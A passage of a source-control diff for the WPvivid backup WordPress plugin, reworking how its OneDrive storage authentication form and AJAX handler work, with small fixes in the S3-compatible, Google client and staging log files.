  | 231 |  | ~~$remote\_options['auth\_id'] = sanitize\_text\_field($\_GET['auth\_id']);~~ |
  | 232 |  | ~~$ret = $wpvivid\_plugin->remote\_collection->update\_remote($remote\_options['auth\_id'], $remote\_options);~~ |
  | 233 |  |  |
  | 234 |  | ~~if ($ret['result'] == 'success') {~~ |
  | 235 |  | ~~header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_one\_drive\_update&result=success');~~ |
  | 236 |  | ~~return;~~ |
  | 237 |  | ~~} else {~~ |
  | 238 |  | ~~header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_one\_drive\_update&result=error&resp\_msg=' . $ret['error']);~~ |
  | 239 |  | ~~return;~~ |
  | 240 |  | ~~}~~ |
  | 241 |  | ~~}~~ |
  | 242 |  | ~~catch (Exception $e){~~ |
  | 243 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 244 |  | ~~}~~ |
  | 245 |  | ~~}~~ |
  | 246 |  | ~~else if($\_GET['action']=='wpvivid\_one\_drive\_update')~~ |
  | 247 |  | ~~{~~ |
  | 248 |  | ~~try {~~ |
  | 249 |  | ~~if (isset($\_GET['result'])) {~~ |
  | 250 |  | ~~if ($\_GET['result'] == 'success') {~~ |
  | 251 |  | ~~add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_edit\_onedrive\_success'));~~ |
  | 252 |  | ~~} else if ($\_GET['result'] == 'error') {~~ |
  | 253 |  | ~~add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_edit\_onedrive\_error'));~~ |
  | 254 |  | ~~}~~ |
  | 255 |  | ~~}~~ |
  | 256 |  | ~~}~~ |
  | 257 |  | ~~catch (Exception $e){~~ |
  | 258 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 259 |  | ~~}~~ |
  | 260 |  | ~~}~~ |
  | 261 | 178 | } |
  | 262 | 179 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L268) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L185) |  |
  | 268 | 185 | global $wpvivid\_plugin; |
  | 269 | 186 | $wpvivid\_plugin->wpvivid\_handle\_remote\_storage\_error($\_GET['resp\_msg'], 'Add OneDrive Remote'); |
  | 270 |  | ~~echo '<div class="notice notice-error"><p>'.esc\_html($\_GET['resp\_msg']).'</p></div>';~~ |
  | 271 |  | ~~}~~ |
  | 272 |  | ~~public function wpvivid\_show\_notice\_edit\_onedrive\_success(){~~ |
  | 273 |  | ~~echo '<div class="notice notice-success is-dismissible"><p>'.\_\_('You have successfully updated the storage alias.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 274 |  | ~~}~~ |
  | 275 |  | ~~public function wpvivid\_show\_notice\_edit\_onedrive\_error(){~~ |
  | 276 |  | ~~global $wpvivid\_plugin;~~ |
  | 277 |  | ~~$wpvivid\_plugin->wpvivid\_handle\_remote\_storage\_error($\_GET['resp\_msg'], 'Update OneDrive Remote');~~ |
  | 278 | 187 | echo '<div class="notice notice-error"><p>'.esc\_html($\_GET['resp\_msg']).'</p></div>'; |
  | 279 | 188 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L292) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L201) |  |
  | 292 | 201 | global $wpvivid\_plugin; |
  | 293 | 202 | $root\_path=apply\_filters('wpvivid\_get\_root\_path', WPVIVID\_REMOTE\_ONEDRIVE); |
  | 294 |  | ?> |
  | 295 |  | <div id="storage\_account\_one\_drive" class="storage-account-page" style="display:none;"> |
  | 296 |  | <div style="background-color:#f1f1f1; padding: 10px;"> |
  | 297 |  | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Microsoft OneDrive authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 203 | if($this->add\_remote) |
  |  | 204 | { |
  |  | 205 | ?> |
  |  | 206 | <div id="storage\_account\_one\_drive" class="storage-account-page" style="display:none;"> |
  |  | 207 | <div style="background-color:#f1f1f1; padding: 10px;"> |
  |  | 208 | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Microsoft OneDrive authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 209 | </div> |
  |  | 210 | <div style="color:#8bc34a; padding: 10px 10px 10px 0;"> |
  |  | 211 | <strong>Authentication is done, please continue to enter the storge information, then click 'Add Now' button to save it.</strong> |
  |  | 212 | </div> |
  |  | 213 | <div style="padding: 10px 10px 10px 0;"> |
  |  | 214 | <strong><?php \_e('Enter Your Microsoft OneDrive Information', 'wpvivid-backuprestore'); ?></strong> |
  |  | 215 | </div> |
  |  | 216 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  |  | 217 | <tbody> |
  |  | 218 | <tr> |
  |  | 219 | <td class="plugin-title column-primary"> |
  |  | 220 | <div class="wpvivid-storage-form"> |
  |  | 221 | <input type="text" class="regular-text" autocomplete="off" option="one\_drive" name="name" placeholder="<?php esc\_attr\_e('Enter a unique alias: e.g. OneDrive-001', 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/[^a-zA-Z0-9\-\_]/g,'')" /> |
  |  | 222 | </div> |
  |  | 223 | </td> |
  |  | 224 | <td class="column-description desc"> |
  |  | 225 | <div class="wpvivid-storage-form-desc"> |
  |  | 226 | <i><?php \_e('A name to help you identify the storage if you have multiple remote storage connected.', 'wpvivid-backuprestore'); ?></i> |
  |  | 227 | </div> |
  |  | 228 | </td> |
  |  | 229 | </tr> |
  |  | 230 | <tr> |
  |  | 231 | <td class="plugin-title column-primary"> |
  |  | 232 | <div class="wpvivid-storage-form"> |
  |  | 233 | <input type="text" class="regular-text" autocomplete="off" option="one\_drive" name="path" value="<?php esc\_attr\_e($root\_path.WPVIVID\_ONEDRIVE\_DEFAULT\_FOLDER); ?>" readonly="readonly" /> |
  |  | 234 | </div> |
  |  | 235 | </td> |
  |  | 236 | <td class="column-description desc"> |
  |  | 237 | <div class="wpvivid-storage-form-desc"> |
  |  | 238 | <i><?php \_e('All backups will be uploaded to this directory.', 'wpvivid-backuprestore'); ?></i> |
  |  | 239 | </div> |
  |  | 240 | </td> |
  |  | 241 | </tr> |
  |  | 242 | <tr> |
  |  | 243 | <td class="plugin-title column-primary"> |
  |  | 244 | <div class="wpvivid-storage-form"> |
  |  | 245 | <input type="text" class="regular-text" autocomplete="off" value="mywebsite01" readonly="readonly" /> |
  |  | 246 | </div> |
  |  | 247 | </td> |
  |  | 248 | <td class="column-description desc"> |
  |  | 249 | <div class="wpvivid-storage-form-desc"> |
  |  | 250 | <a href="https://docs.wpvivid.com/wpvivid-backup-pro-microsoft-onedrive-custom-folder-name.html"><?php \_e('Pro feature: Create a directory for storing the backups of the site', 'wpvivid-backuprestore'); ?></a> |
  |  | 251 | </div> |
  |  | 252 | </td> |
  |  | 253 | </tr> |
  |  | 254 | <tr> |
  |  | 255 | <td class="plugin-title column-primary"> |
  |  | 256 | <div class="wpvivid-storage-select"> |
  |  | 257 | <label> |
  |  | 258 | <input type="checkbox" option="one\_drive" name="default" checked /><?php \_e('Set as the default remote storage.', 'wpvivid-backuprestore'); ?> |
  |  | 259 | </label> |
  |  | 260 | </div> |
  |  | 261 | </td> |
  |  | 262 | <td class="column-description desc"> |
  |  | 263 | <div class="wpvivid-storage-form-desc"> |
  |  | 264 | <i><?php \_e('Once checked, all this sites backups sent to a remote storage destination will be uploaded to this storage by default.', 'wpvivid-backuprestore'); ?></i> |
  |  | 265 | </div> |
  |  | 266 | </td> |
  |  | 267 | </tr> |
  |  | 268 | <tr> |
  |  | 269 | <td class="plugin-title column-primary"> |
  |  | 270 | <div class="wpvivid-storage-form"> |
  |  | 271 | <input id="wpvivid\_one\_drive\_auth" class="button-primary" type="submit" value="<?php esc\_attr\_e('Add Now', 'wpvivid-backuprestore'); ?>"> |
  |  | 272 | </div> |
  |  | 273 | </td> |
  |  | 274 | <td class="column-description desc"> |
  |  | 275 | <div class="wpvivid-storage-form-desc"> |
  |  | 276 | <i><?php \_e('Click the button to add the storage.', 'wpvivid-backuprestore'); ?></i> |
  |  | 277 | </div> |
  |  | 278 | </td> |
  |  | 279 | </tr> |
  |  | 280 | </tbody> |
  |  | 281 | </table> |
  | 298 | 282 | </div> |
  | 299 |  | <div style="padding: 10px 10px 10px 0;"> |
  | 300 |  | <strong><?php \_e('Enter Your Microsoft OneDrive Information', 'wpvivid-backuprestore'); ?></strong> |
  | 301 |  | </div> |
  | 302 |  | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  | 303 |  | <tbody> |
  | 304 |  | <tr> |
  | 305 |  | <td class="plugin-title column-primary"> |
  | 306 |  | <div class="wpvivid-storage-form"> |
  | 307 |  | <input type="text" class="regular-text" autocomplete="off" option="one\_drive" name="name" placeholder="<?php esc\_attr\_e('Enter a unique alias: e.g. OneDrive-001', 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/[^a-zA-Z0-9\-\_]/g,'')" /> |
  | 308 |  | </div> |
  | 309 |  | </td> |
  | 310 |  | <td class="column-description desc"> |
  | 311 |  | <div class="wpvivid-storage-form-desc"> |
  | 312 |  | <i><?php \_e('A name to help you identify the storage if you have multiple remote storage connected.', 'wpvivid-backuprestore'); ?></i> |
  | 313 |  | </div> |
  | 314 |  | </td> |
  | 315 |  | </tr> |
  | 316 |  | <tr> |
  | 317 |  | <td class="plugin-title column-primary"> |
  | 318 |  | <div class="wpvivid-storage-form"> |
  | 319 |  | <input type="text" class="regular-text" autocomplete="off" option="one\_drive" name="path" value="<?php esc\_attr\_e($root\_path.WPVIVID\_ONEDRIVE\_DEFAULT\_FOLDER); ?>" readonly="readonly" /> |
  | 320 |  | </div> |
  | 321 |  | </td> |
  | 322 |  | <td class="column-description desc"> |
  | 323 |  | <div class="wpvivid-storage-form-desc"> |
  | 324 |  | <i><?php \_e('All backups will be uploaded to this directory.', 'wpvivid-backuprestore'); ?></i> |
  | 325 |  | </div> |
  | 326 |  | </td> |
  | 327 |  | </tr> |
  | 328 |  | <tr> |
  | 329 |  | <td class="plugin-title column-primary"> |
  | 330 |  | <div class="wpvivid-storage-form"> |
  | 331 |  | <input type="text" class="regular-text" autocomplete="off" value="mywebsite01" readonly="readonly" /> |
  | 332 |  | </div> |
  | 333 |  | </td> |
  | 334 |  | <td class="column-description desc"> |
  | 335 |  | <div class="wpvivid-storage-form-desc"> |
  | 336 |  | <a href="https://docs.wpvivid.com/wpvivid-backup-pro-microsoft-onedrive-custom-folder-name.html"><?php \_e('Pro feature: Create a directory for storing the backups of the site', 'wpvivid-backuprestore'); ?></a> |
  | 337 |  | </div> |
  | 338 |  | </td> |
  | 339 |  | </tr> |
  | 340 |  | <tr> |
  | 341 |  | <td class="plugin-title column-primary"> |
  | 342 |  | <div class="wpvivid-storage-select"> |
  | 343 |  | <label> |
  | 344 |  | <input type="checkbox" option="one\_drive" name="default" checked /><?php \_e('Set as the default remote storage.', 'wpvivid-backuprestore'); ?> |
  | 345 |  | </label> |
  | 346 |  | </div> |
  | 347 |  | </td> |
  | 348 |  | <td class="column-description desc"> |
  | 349 |  | <div class="wpvivid-storage-form-desc"> |
  | 350 |  | <i><?php \_e('Once checked, all this sites backups sent to a remote storage destination will be uploaded to this storage by default.', 'wpvivid-backuprestore'); ?></i> |
  | 351 |  | </div> |
  | 352 |  | </td> |
  | 353 |  | </tr> |
  | 354 |  | <tr> |
  | 355 |  | <td class="plugin-title column-primary"> |
  | 356 |  | <div class="wpvivid-storage-form"> |
  | 357 |  | <input onclick="wpvivid\_one\_drive\_auth();" class="button-primary" type="submit" value="<?php esc\_attr\_e('Authenticate with Microsoft OneDrive', 'wpvivid-backuprestore'); ?>"> |
  | 358 |  | </div> |
  | 359 |  | </td> |
  | 360 |  | <td class="column-description desc"> |
  | 361 |  | <div class="wpvivid-storage-form-desc"> |
  | 362 |  | <i><?php \_e('Click the button to get Microsoft authentication and add it to the storage list below.', 'wpvivid-backuprestore'); ?></i> |
  | 363 |  | </div> |
  | 364 |  | </td> |
  | 365 |  | </tr> |
  | 366 |  | </tbody> |
  | 367 |  | </table> |
  | 368 |  | </div> |
  | 369 |  | <script> |
  | 370 |  | function wpvivid\_check\_onedrive\_storage\_alias(storage\_alias){ |
  | 371 |  | var find = 1; |
  | 372 |  | jQuery('#wpvivid\_remote\_storage\_list tr').each(function (i) { |
  | 373 |  | jQuery(this).children('td').each(function (j) { |
  | 374 |  | if (j == 3) { |
  | 375 |  | if (jQuery(this).text() == storage\_alias) { |
  | 376 |  | find = -1; |
  | 377 |  | return false; |
  |  | 283 | <script> |
  |  | 284 | function wpvivid\_check\_onedrive\_storage\_alias(storage\_alias) |
  |  | 285 | { |
  |  | 286 | var find = 1; |
  |  | 287 | jQuery('#wpvivid\_remote\_storage\_list tr').each(function (i) { |
  |  | 288 | jQuery(this).children('td').each(function (j) { |
  |  | 289 | if (j == 3) { |
  |  | 290 | if (jQuery(this).text() == storage\_alias) { |
  |  | 291 | find = -1; |
  |  | 292 | return false; |
  |  | 293 | } |
  | 378 | 294 | } |
  |  | 295 | }); |
  |  | 296 | }); |
  |  | 297 | return find; |
  |  | 298 | } |
  |  | 299 |  |
  |  | 300 | jQuery('#wpvivid\_one\_drive\_auth').click(function() |
  |  | 301 | { |
  |  | 302 | wpvivid\_one\_drive\_auth(); |
  |  | 303 | }); |
  |  | 304 |  |
  |  | 305 | function wpvivid\_one\_drive\_auth() |
  |  | 306 | { |
  |  | 307 | wpvivid\_settings\_changed = false; |
  |  | 308 | var name=''; |
  |  | 309 | var path=''; |
  |  | 310 | jQuery('input:text[option=one\_drive]').each(function() |
  |  | 311 | { |
  |  | 312 | var key = jQuery(this).prop('name'); |
  |  | 313 | if(key==='name') |
  |  | 314 | { |
  |  | 315 | name = jQuery(this).val(); |
  | 379 | 316 | } |
  | 380 | 317 | }); |
  | 381 |  | }); |
  | 382 |  | return find; |
  | 383 |  | } |
  | 384 |  | function wpvivid\_one\_drive\_auth() |
  | 385 |  | { |
  | 386 |  | wpvivid\_settings\_changed = false; |
  | 387 |  | var name=''; |
  | 388 |  | var path=''; |
  | 389 |  | jQuery('input:text[option=one\_drive]').each(function() |
  | 390 |  | { |
  | 391 |  | var key = jQuery(this).prop('name'); |
  | 392 |  | if(key==='name') |
  |  | 318 |  |
  |  | 319 | var remote\_default='0'; |
  |  | 320 |  |
  |  | 321 | jQuery('input:checkbox[option=one\_drive]').each(function() |
  | 393 | 322 | { |
  | 394 |  | name = jQuery(this).val(); |
  |  | 323 | if(jQuery(this).prop('checked')) { |
  |  | 324 | remote\_default='1'; |
  |  | 325 | } |
  |  | 326 | else { |
  |  | 327 | remote\_default='0'; |
  |  | 328 | } |
  |  | 329 | }); |
  |  | 330 | if(name == ''){ |
  |  | 331 | alert(wpvividlion.remotealias); |
  | 395 | 332 | } |
  | 396 |  | }); |
  | 397 |  |  |
  | 398 |  | var remote\_default='0'; |
  | 399 |  |  |
  | 400 |  | jQuery('input:checkbox[option=one\_drive]').each(function() |
  | 401 |  | { |
  | 402 |  | if(jQuery(this).prop('checked')) { |
  | 403 |  | remote\_default='1'; |
  |  | 333 | else if(wpvivid\_check\_onedrive\_storage\_alias(name) === -1){ |
  |  | 334 | alert(wpvividlion.remoteexist); |
  | 404 | 335 | } |
  | 405 | 336 | else { |
  | 406 |  | remote\_default='0'; |
  |  | 337 | var ajax\_data; |
  |  | 338 | var remote\_from = wpvivid\_ajax\_data\_transfer('one\_drive'); |
  |  | 339 | ajax\_data = { |
  |  | 340 | 'action': 'wpvivid\_one\_drive\_add\_remote', |
  |  | 341 | 'remote': remote\_from |
  |  | 342 | }; |
  |  | 343 | jQuery('#wpvivid\_one\_drive\_auth').css({'pointer-events': 'none', 'opacity': '0.4'}); |
  |  | 344 | jQuery('#wpvivid\_remote\_notice').html(''); |
  |  | 345 | wpvivid\_post\_request(ajax\_data, function (data) |
  |  | 346 | { |
  |  | 347 | try |
  |  | 348 | { |
  |  | 349 | var jsonarray = jQuery.parseJSON(data); |
  |  | 350 | if (jsonarray.result === 'success') |
  |  | 351 | { |
  |  | 352 | jQuery('#wpvivid\_one\_drive\_auth').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 353 | jQuery('input:text[option=one\_drive]').each(function(){ |
  |  | 354 | jQuery(this).val(''); |
  |  | 355 | }); |
  |  | 356 | jQuery('input:password[option=one\_drive]').each(function(){ |
  |  | 357 | jQuery(this).val(''); |
  |  | 358 | }); |
  |  | 359 | wpvivid\_handle\_remote\_storage\_data(data); |
  |  | 360 | location.href='admin.php?page=WPvivid&action=wpvivid\_one\_drive&main\_tab=storage&sub\_tab=one\_drive&sub\_page=storage\_account\_one\_drive&result=success'; |
  |  | 361 | } |
  |  | 362 | else if (jsonarray.result === 'failed') |
  |  | 363 | { |
  |  | 364 | jQuery('#wpvivid\_remote\_notice').html(jsonarray.notice); |
  |  | 365 | jQuery('input[option=add-remote]').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 366 | } |
  |  | 367 | } |
  |  | 368 | catch (err) |
  |  | 369 | { |
  |  | 370 | alert(err); |
  |  | 371 | jQuery('input[option=add-remote]').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 372 | } |
  |  | 373 |  |
  |  | 374 | }, function (XMLHttpRequest, textStatus, errorThrown) |
  |  | 375 | { |
  |  | 376 | var error\_message = wpvivid\_output\_ajaxerror('adding the remote storage', textStatus, errorThrown); |
  |  | 377 | alert(error\_message); |
  |  | 378 | jQuery('#wpvivid\_one\_drive\_auth').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 379 | }); |
  | 407 | 380 | } |
  | 408 |  | }); |
  | 409 |  | if(name == ''){ |
  | 410 |  | alert(wpvividlion.remotealias); |
  | 411 |  | } |
  | 412 |  | else if(wpvivid\_check\_onedrive\_storage\_alias(name) === -1){ |
  | 413 |  | alert(wpvividlion.remoteexist); |
  | 414 |  | } |
  | 415 |  | else { |
  | 416 |  | location.href = '<?php echo admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_one\_drive\_auth&name='?>' + name + '&default=' + remote\_default; |
  | 417 |  | } |
  | 418 |  | } |
  | 419 |  | </script> |
  | 420 |  | <?php |
  |  | 381 | } |
  |  | 382 | </script> |
  |  | 383 | <?php |
  |  | 384 | } |
  |  | 385 | else |
  |  | 386 | { |
  |  | 387 | ?> |
  |  | 388 | <div id="storage\_account\_one\_drive" class="storage-account-page" style="display:none;"> |
  |  | 389 | <div style="background-color:#f1f1f1; padding: 10px;"> |
  |  | 390 | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Microsoft OneDrive authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 391 | </div> |
  |  | 392 | <div style="padding: 10px 10px 10px 0;"> |
  |  | 393 | <strong><?php \_e('To add OneDrive, please get Microsoft authentication first. Once authenticated, you will be redirected to this page, then you can add storage information and save it', 'wpvivid-backuprestore'); ?></strong> |
  |  | 394 | </div> |
  |  | 395 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  |  | 396 | <tbody> |
  |  | 397 | <tr> |
  |  | 398 | <td class="plugin-title column-primary"> |
  |  | 399 | <div class="wpvivid-storage-form"> |
  |  | 400 | <input onclick="wpvivid\_one\_drive\_auth();" class="button-primary" type="submit" value="<?php esc\_attr\_e('Authenticate with Microsoft OneDrive', 'wpvivid-backuprestore'); ?>"> |
  |  | 401 | </div> |
  |  | 402 | </td> |
  |  | 403 | <td class="column-description desc"> |
  |  | 404 | <div class="wpvivid-storage-form-desc"> |
  |  | 405 | <i><?php \_e('Click to get Microsoft authentication.', 'wpvivid-backuprestore'); ?></i> |
  |  | 406 | </div> |
  |  | 407 | </td> |
  |  | 408 | </tr> |
  |  | 409 | </tbody> |
  |  | 410 | </table> |
  |  | 411 | </div> |
  |  | 412 | <script> |
  |  | 413 | function wpvivid\_one\_drive\_auth() |
  |  | 414 | { |
  |  | 415 | location.href = '<?php echo admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_one\_drive\_auth'?>'; |
  |  | 416 | } |
  |  | 417 | </script> |
  |  | 418 | <?php |
  |  | 419 | } |
  | 421 | 420 | } |
  | 422 | 421 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L445) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L444) |  |
  | 445 | 444 | <td class="plugin-title column-primary"> |
  | 446 | 445 | <div class="wpvivid-storage-form"> |
  | 447 |  | <input ~~onclick="wpvivid\_one\_drive\_update\_auth();" class="button-primary" type="submit~~" value="<?php esc\_attr\_e('Save Changes', 'wpvivid-backuprestore'); ?>"> |
  |  | 446 | <input class="button-primary" type="submit" option="edit-remote" value="<?php esc\_attr\_e('Save Changes', 'wpvivid-backuprestore'); ?>"> |
  | 448 | 447 | </div> |
  | 449 | 448 | </td> |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L1252) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L1251) |  |
  | 1252 | 1251 | return $storage\_type; |
  | 1253 | 1252 | } |
  |  | 1253 |  |
  |  | 1254 | public function finish\_add\_remote() |
  |  | 1255 | { |
  |  | 1256 | global $wpvivid\_plugin; |
  |  | 1257 | $wpvivid\_plugin->ajax\_check\_security(); |
  |  | 1258 | try { |
  |  | 1259 | if (empty($\_POST) || !isset($\_POST['remote']) || !is\_string($\_POST['remote'])) { |
  |  | 1260 | die(); |
  |  | 1261 | } |
  |  | 1262 |  |
  |  | 1263 | $tmp\_remote\_options =get\_option('wpvivid\_tmp\_remote\_options',array()); |
  |  | 1264 | delete\_option('wpvivid\_tmp\_remote\_options'); |
  |  | 1265 | if(empty($tmp\_remote\_options)||$tmp\_remote\_options['type']!==WPVIVID\_REMOTE\_ONEDRIVE) |
  |  | 1266 | { |
  |  | 1267 | die(); |
  |  | 1268 | } |
  |  | 1269 |  |
  |  | 1270 | $json = $\_POST['remote']; |
  |  | 1271 | $json = stripslashes($json); |
  |  | 1272 | $remote\_options = json\_decode($json, true); |
  |  | 1273 | if (is\_null($remote\_options)) { |
  |  | 1274 | die(); |
  |  | 1275 | } |
  |  | 1276 |  |
  |  | 1277 | $remote\_options['path'] = WPVIVID\_ONEDRIVE\_DEFAULT\_FOLDER; |
  |  | 1278 | $remote\_options=array\_merge($remote\_options,$tmp\_remote\_options); |
  |  | 1279 |  |
  |  | 1280 | $ret = $wpvivid\_plugin->remote\_collection->add\_remote($remote\_options); |
  |  | 1281 |  |
  |  | 1282 | if ($ret['result'] == 'success') { |
  |  | 1283 | $html = ''; |
  |  | 1284 | $html = apply\_filters('wpvivid\_add\_remote\_storage\_list', $html); |
  |  | 1285 | $ret['html'] = $html; |
  |  | 1286 | $pic = ''; |
  |  | 1287 | $pic = apply\_filters('wpvivid\_schedule\_add\_remote\_pic', $pic); |
  |  | 1288 | $ret['pic'] = $pic; |
  |  | 1289 | $dir = ''; |
  |  | 1290 | $dir = apply\_filters('wpvivid\_get\_remote\_directory', $dir); |
  |  | 1291 | $ret['dir'] = $dir; |
  |  | 1292 | $schedule\_local\_remote = ''; |
  |  | 1293 | $schedule\_local\_remote = apply\_filters('wpvivid\_schedule\_local\_remote', $schedule\_local\_remote); |
  |  | 1294 | $ret['local\_remote'] = $schedule\_local\_remote; |
  |  | 1295 | $remote\_storage = ''; |
  |  | 1296 | $remote\_storage = apply\_filters('wpvivid\_remote\_storage', $remote\_storage); |
  |  | 1297 | $ret['remote\_storage'] = $remote\_storage; |
  |  | 1298 | $remote\_select\_part = ''; |
  |  | 1299 | $remote\_select\_part = apply\_filters('wpvivid\_remote\_storage\_select\_part', $remote\_select\_part); |
  |  | 1300 | $ret['remote\_select\_part'] = $remote\_select\_part; |
  |  | 1301 | $default = array(); |
  |  | 1302 | $remote\_array = apply\_filters('wpvivid\_archieve\_remote\_array', $default); |
  |  | 1303 | $ret['remote\_array'] = $remote\_array; |
  |  | 1304 | $success\_msg = \_\_('You have successfully added a remote storage.', 'wpvivid-backuprestore'); |
  |  | 1305 | $ret['notice'] = apply\_filters('wpvivid\_add\_remote\_notice', true, $success\_msg); |
  |  | 1306 | } |
  |  | 1307 | else{ |
  |  | 1308 | $ret['notice'] = apply\_filters('wpvivid\_add\_remote\_notice', false, $ret['error']); |
  |  | 1309 | } |
  |  | 1310 |  |
  |  | 1311 | } |
  |  | 1312 | catch (Exception $error) { |
  |  | 1313 | $message = 'An exception has occurred. class: '.get\_class($error).';msg: '.$error->getMessage().';code: '.$error->getCode().';line: '.$error->getLine().';in\_file: '.$error->getFile().';'; |
  |  | 1314 | error\_log($message); |
  |  | 1315 | echo json\_encode(array('result'=>'failed','error'=>$message)); |
  |  | 1316 | die(); |
  |  | 1317 | } |
  |  | 1318 | echo json\_encode($ret); |
  |  | 1319 | die(); |
  |  | 1320 | } |
  | 1254 | 1321 | } |
* ## [wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-s3compat.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-s3compat.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-s3compat.php")

  | [r2429460](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-s3compat.php?rev=2429460#L752 "Show revision 2429460 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-s3compat.php?rev=2667839#L752 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 752 | 752 | private function compare\_php\_version(){ |
  | 753 | 753 | if(version\_compare(WPVIVID\_GOOGLE\_NEED\_PHP\_VERSION,phpversion()) > 0){ |
  | 754 |  | return array('result' => WPVIVID\_FAILED,~~error~~ => 'The required PHP version is higher than '.WPVIVID\_S3COMPAT\_NEED\_PHP\_VERSION.'. After updating your PHP version, please try again.'); |
  |  | 754 | return array('result' => WPVIVID\_FAILED,'error' => 'The required PHP version is higher than '.WPVIVID\_S3COMPAT\_NEED\_PHP\_VERSION.'. After updating your PHP version, please try again.'); |
  | 755 | 755 | } |
  | 756 | 756 | return array('result' => WPVIVID\_SUCCESS); |
* ## [wpvivid-backuprestore/trunk/includes/lib/google-api-php-client/src/Google/Client.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/lib/google-api-php-client/src/Google/Client.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/lib/google-api-php-client/src/Google/Client.php")

  | [r2587441](/browser/wpvivid-backuprestore/trunk/includes/lib/google-api-php-client/src/Google/Client.php?rev=2587441#L1063 "Show revision 2587441 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/lib/google-api-php-client/src/Google/Client.php?rev=2667839#L1063 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 1063 | 1063 | } else { |
  | 1064 | 1064 | // guzzle 6 |
  | 1065 |  | $options['base\_uri'] = $this->config['base\_path']; |
  |  | 1065 | $options['base\_uri'] = $this->config['base\_path']; |
  |  | 1066 | $options['verify'] = WPVIVID\_PLUGIN\_DIR.'/vendor/guzzle/guzzle/src/Guzzle/Http/Resources/cacert.pem'; |
  | 1066 | 1067 | } |
  | 1067 | 1068 |  |
* ## [wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php")

  | [r2590701](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php?rev=2590701#L454 "Show revision 2590701 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php?rev=2667839#L454 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 454 | 454 | public function get\_staging\_log\_list($ret) |
  | 455 | 455 | { |
  | 456 |  | $html=$ret['html']; |
  |  | 456 | $html='';//$ret['html']; |
  | 457 | 457 | $loglist=$this->get\_log\_list('staging'); |
  | 458 | 458 | $current\_num=1; |
  | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php?rev=2590701#L474) | […](/browser/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log-page.php?rev=2667839#L474) |  |
  | 474 | 474 | else{ |
  | 475 | 475 | $offset=get\_option('gmt\_offset'); |
  | 476 |  | $localtime = strtotime($value['time'])~~+ $offset \* 60 \* 60~~; |
  |  | 476 | $localtime = strtotime($value['time'])/\* + $offset \* 60 \* 60\*/; |
  | 477 | 477 | $value['time'] = date('F-d-Y H:i:s',$localtime); |
  | 478 | 478 | } |
* ## [wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/staging/class-wpvivid-staging-log.php")

